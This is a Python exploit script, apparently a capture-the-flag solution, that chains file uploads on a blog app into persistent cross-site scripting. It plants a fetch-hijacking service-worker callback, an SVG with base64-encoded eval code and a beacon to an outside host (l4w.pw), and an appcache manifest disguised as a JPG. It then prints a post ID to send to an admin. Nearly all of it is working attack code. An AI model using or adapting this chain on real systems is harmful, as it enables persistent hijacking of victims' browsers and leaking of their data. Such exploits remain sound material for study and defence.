import requests
import re,urllib
import base64


URL = 'https://h4x0rs.space/blog/'



# CALLBACK to get Persistent XSS
trigger = """`;onfetch=(e)=>{e.respondWith(new Response('<iframe src=//l4w.io>',{headers:{'Content-Type':'text/html'}}))}//"""
values = {'title':trigger,'pad':trigger,'submit':'go'}

r1 = requests.post(URL+'create.php', data=values)
callback_path = re.findall('id=([a-f0-9]{64})',r1.text)[0]




# SVG
eval_script = """navigator.serviceWorker.register("/blog/pad.php?id=%s&callback=%%60",{'scope':'/blog/'}).then(function(registration) {
			  console.log('ServiceWorker registration successful with scope: ',    registration.scope);
			}).catch(function(err) {
			  console.log('ServiceWorker registration failed: ', err);
			});"""
eval_script = base64.b64encode(eval_script  % callback_path)

svgfile = """<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
   <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
   <script type="text/javascript">
            eval(atob('{}'));
            new Image().src = 'http://l4w.pw/'+escape(document.domain);
   </script>
</svg>
""".format(eval_script);
f = open('./svgfile.svg','wb')
f.write(svgfile)
f.close()
files = {'image': open('./svgfile.svg','rb')}
values = {'title':'abc','pad':'def','submit':'go'}
r1 = requests.post(URL+'create.php', files=files, data=values)
svgfile_path = re.findall('id=([a-f0-9]{64})',r1.text)[0]




# CACHE MANIFEST FILE
appcache = """CACHE MANIFEST
FALLBACK:
/blog/untrusted_files/ /blog/untrusted_files/{0}.svg
""".format(svgfile_path)
f = open('./appcache.jpg','wb')
f.write(appcache)
f.close()
files = {'image': open('./appcache.jpg','rb')}
values = {'title':'abc','pad':'def','submit':'go'}
r1 = requests.post(URL+'create.php', files=files, data=values)
appcache_path = re.findall('id=([a-f0-9]{64})',r1.text)[0]



# TRIGGER
trigger = """
[yt]{0}[/yt]
""".format(
	urllib.quote('--><html manifest=/blog/untrusted_files/{0}.jpg>'.format(appcache_path)).replace('/','%2f'))

for i in range(40):
	trigger += "[yt]"+str(i)+"[/yt]"; # Why have to do this ? it's just because loading appcache needs time, so I designed a mechainsm let loading iframes one by one, and delay it for 40*20 miliseconds.
trigger += "[yt]#[/yt]" # then now, trigger the bug, use hashtag to remove parameter &p= -> turn into 500 -> error -> fallback triggered -> loading svg

# SVG -> eval evil code -> Use callback pad.php to setup serviceworker to get persistent XSS

values = {'title':'abc','pad':trigger,'submit':'go'}
r1 = requests.post(URL+'create.php', data=values)
trigger_path = re.findall('id=([a-f0-9]{64})',r1.text)[0]

print 'Send this blog ID to admin =>', trigger_path

